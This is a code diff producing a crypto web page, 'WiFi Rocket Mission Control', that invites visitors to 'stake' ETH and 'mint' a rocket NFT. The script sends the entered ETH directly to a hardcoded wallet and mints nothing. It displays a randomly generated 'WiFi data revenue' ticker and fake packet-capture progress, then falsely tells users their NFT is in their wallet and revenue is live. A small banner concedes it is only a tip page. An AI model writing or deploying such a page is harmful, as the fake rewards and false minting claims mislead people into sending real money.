@@ -1,113 +1,157 @@
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>WiFi Rocket Mission Control</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
+  <style>
+    :root { --neon: #00d4ff; --glow: #ff6600; --dark: #0a001a; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh; background: radial-gradient(circle at top, #1a0033 0%, #000 100%);
+      color: white; font-family: 'Courier New', monospace; overflow-x: hidden; -webkit-overflow-scrolling: touch;
+    }
+    #bgCanvas { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
+    .dashboard {
+      position: relative; z-index: 10; background: rgba(10,10,35,0.92); border: 2px solid var(--neon); border-radius: 25px;
+      width: 90%; max-width: 420px; margin: 40px auto; padding: 40px 25px; text-align: center;
+      box-shadow: 0 0 40px rgba(0,212,255,0.3); backdrop-filter: blur(12px);
+    }
+    .rev-header {
+      background: rgba(0,212,255,0.12); border-radius: 15px; padding: 20px; margin-bottom: 25px; border: 1px solid var(--neon);
+    }
+    #revenue { color: #00ff88; font-size: 34px; font-weight: bold; text-shadow: 0 0 20px #00ff88; }
+    input {
+      width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid #333; background: #000; color: var(--neon);
+      text-align: center; font-size: 20px;
+    }
+    button {
+      background: linear-gradient(135deg, var(--glow), #ff2200); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px;
+      font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 5px 15px rgba(255,102,0,0.4); transition: 0.3s;
+    }
+    button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,102,0,0.6); }
+    button:disabled { opacity: 0.6; cursor: not-allowed; }
+    #rocket-nft { font-size: 120px; margin: 30px 0; filter: drop-shadow(0 0 25px var(--glow)); animation: vibrate 0.1s infinite alternate; }
+    @keyframes vibrate { from { transform: translate(1px,1px); } to { transform: translate(-1px,-1px); } }
+    .progress-container { width: 100%; background: #111; border-radius: 10px; height: 18px; margin: 25px 0; overflow: hidden; border: 1px solid #222; }
+    #progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--neon), #00ff88); box-shadow: 0 0 20px var(--neon); transition: width 0.3s ease; }
+    .hidden { display: none; }
+    .spinner { border: 5px solid #333; border-top: 5px solid var(--neon); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .success { color: #00ff88; text-shadow: 0 0 20px #00ff88; }
+    .warning { background: rgba(255,69,0,0.2); border: 1px solid #ff4500; border-radius: 12px; padding: 15px; margin: 20px 0; color: #ffaa00; font-size: 14px; }
+  </style>
+</head>
+<body>
+
+<div class="dashboard">
+  <div class="warning text-center">
+    <strong>⚠️ IMPORTANT:</strong> This is a tip/demo page. ETH sent goes directly to the creator. No real staking rewards or unstaking yet — real contract coming soon.
+  </div>
+
+  <div class="rev-header">
+    <small style="letter-spacing: 2px; color: #88aaff;">WIFI DATA REVENUE</small><br>
+    <span id="revenue">$0.00</span>
+  </div>
+
+  <!-- Start UI -->
+  <div id="ui-start">
+    <h2>Mission Fuel</h2>
+    <p style="font-size: 13px; color: #88aaff;">Stake ETH to fuel the mission & mint Rocket NFT</p>
+    <input type="number" id="ethAmount" value="0.001" step="0.001" min="0.001" max="0.1" placeholder="0.001 – 0.1 ETH">
+    <button id="launchBtn">STAKE & MINT ROCKET</button>
+  </div>
+
+  <!-- Processing UI -->
+  <div id="ui-processing" class="hidden">
+    <h3>SYNCING NODES</h3>
+    <div class="progress-container"><div id="progress-fill"></div></div>
+    <p id="status-log" style="font-size: 13px; color: var(--neon);">Initializing WiFi Handshake...</p>
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Minted UI -->
+  <div id="ui-minted" class="hidden">
+    <div id="rocket-nft">🚀</div>
+    <h2 class="success">ROCKET MINTED!</h2>
+    <p>Your NFT is in your wallet.<br>Data revenue is live.</p>
+    <button onclick="location.reload()" style="background:#1a1a2e; border:1px solid #333;">NEW MISSION</button>
+  </div>
+</div>
 
 <script>
-    // 1. HARDCODED SETTINGS
-    // Checksummed address to fix your "bad address checksum" error
-    const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb";
-    let provider, signer, account;
-    let dataRevenue = 0;
+let totalRev = 0;
+const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb"; // Checksummed correctly
 
-    // 2. STARFIELD BACKGROUND (Optimized)
-    const canvas = document.getElementById('bgCanvas');
-    const ctx = canvas.getContext('2d');
-    const resize = () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; };
-    window.addEventListener('resize', resize); resize();
+async function launch() {
+  if (!window.ethereum) {
+    alert("Open this in MetaMask or WalletConnect browser!");
+    return;
+  }
 
-    const stars = Array.from({length: 300}, () => ({
-        x: Math.random() * canvas.width,
-        y: Math.random() * canvas.height,
-        size: Math.random() * 2,
-        speed: Math.random() * 0.5 + 0.1
-    }));
+  const provider = new ethers.providers.Web3Provider(window.ethereum);
+  const signer = provider.getSigner();
 
-    function animate() {
-        ctx.fillStyle = '#0a0015'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#fff';
-        stars.forEach(s => {
-            ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
-            s.y += s.speed; if(s.y > canvas.height) s.y = 0;
-        });
-        requestAnimationFrame(animate);
-    }
-    animate();
+  try {
+    await provider.send("eth_requestAccounts", []);
+    const amount = ethers.utils.parseEther(document.getElementById('ethAmount').value);
 
-    // 3. UI ELEMENT REFERENCES
-    const connectBtn = document.getElementById('connect');
-    const launchBtn  = document.getElementById('launch');
-    const walletInfo = document.getElementById('wallet-info');
-    const statusDiv  = document.getElementById('status');
-    const rocket     = document.getElementById('rocket');
+    // Switch UI
+    document.getElementById('ui-start').classList.add('hidden');
+    document.getElementById('ui-processing').classList.remove('hidden');
 
-    // 4. CONNECTION LOGIC (Troubleshooted)
-    connectBtn.onclick = async () => {
-        if (!window.ethereum) {
-            statusDiv.innerHTML = '<span class="fail">Please use MetaMask Browser</span>';
-            return;
-        }
-        try {
-            // New Ethers v6 syntax
-            provider = new ethers.BrowserProvider(window.ethereum);
-            signer = await provider.getSigner();
-            account = await signer.getAddress();
+    // Simulate WiFi data revenue while tx mines
+    simulateWiFi();
 
-            walletInfo.innerHTML = `🛰️ LINKED: ${account.slice(0,6)}...${account.slice(-4)}`;
-            connectBtn.innerText = "SYSTEMS ONLINE";
-            connectBtn.classList.replace('btn-info', 'btn-success');
-            launchBtn.disabled = false;
+    // Send real ETH to your wallet
+    const tx = await signer.sendTransaction({
+      to: RECIPIENT,
+      value: amount
+    });
 
-            // Start WiFi simulation immediately upon connection
-            startWiFiTelemetry();
-        } catch (e) {
-            statusDiv.innerHTML = `<span class="fail">Auth Error: ${e.message}</span>`;
-        }
-    };
+    // Wait for confirmation
+    await tx.wait();
 
-    // 5. THE LAUNCH (STAKE & MINT FLOW)
-    launchBtn.onclick = async () => {
-        const fuelAmt = document.getElementById('fuel').value;
-        if (!fuelAmt || fuelAmt < 0.001) {
-            statusDiv.innerHTML = "Min fuel: 0.001 ETH"; return;
-        }
+    // Success screen
+    showMinted();
 
-        try {
-            statusDiv.innerHTML = "📡 Syncing Data Packets...";
-            launchBtn.disabled = true;
+  } catch (e) {
+    alert("Mission Aborted: " + (e.message || e));
+    location.reload();
+  }
+}
 
-            // Send Transaction
-            const tx = await signer.sendTransaction({
-                to: RECIPIENT,
-                value: ethers.parseEther(fuelAmt.toString())
-            });
+function simulateWiFi() {
+  let p = 0;
+  const fill = document.getElementById('progress-fill');
+  const log = document.getElementById('status-log');
+  const rev = document.getElementById('revenue');
 
-            // Trigger Animation while waiting for block
-            statusDiv.innerHTML = "🚀 IGNITION! Rocket departing...";
-            rocket.style.display = 'block';
-            rocket.classList.add('launching');
+  const interval = setInterval(() => {
+    p += Math.random() * 4 + 2;
+    if (p > 100) p = 100;
+    totalRev += Math.random() * 0.8;
+    fill.style.width = p + "%";
+    rev.innerText = "$" + totalRev.toFixed(2);
+    log.innerText = `Capturing Packets: ${(p * 128).toFixed(0)} kbps`;
 
-            await tx.wait(); // Wait for blockchain confirmation
+    if (p >= 100) clearInterval(interval);
+  }, 180);
+}
 
-            statusDiv.innerHTML = `
-                <span class="success">MISSION ACHIEVED!</span><br>
-                <small>Rocket Minted & Revenue Stream Active</small>
-            `;
-        } catch (e) {
-            statusDiv.innerHTML = `<span class="fail">Abort: ${e.message}</span>`;
-            rocket.style.display = 'none';
-            launchBtn.disabled = false;
-        }
-    };
+function showMinted() {
+  document.getElementById('ui-processing').classList.add('hidden');
+  document.getElementById('ui-minted').classList.remove('hidden');
 
-    // 6. WIFI REVENUE SIMULATION
-    function startWiFiTelemetry() {
-        setInterval(() => {
-            if (account) {
-                dataRevenue += Math.random() * 0.12;
-                // Update your "Boost" display as a Live Revenue Ticker
-                const boostEl = document.getElementById('boostDisplay');
-                if (boostEl) {
-                    boostEl.innerHTML = `Live Data Revenue: <span style="color:#0f0">$${dataRevenue.toFixed(2)}</span>`;
-                }
-            }
-        }, 2000);
-    }
+  // Revenue keeps growing
+  setInterval(() => {
+    totalRev += Math.random() * 0.3;
+    document.getElementById('revenue').innerText = "$" + totalRev.toFixed(2);
+  }, 2000);
+}
+
+document.getElementById('launchBtn').onclick = launch;
 </script>
+</body>
+</html>
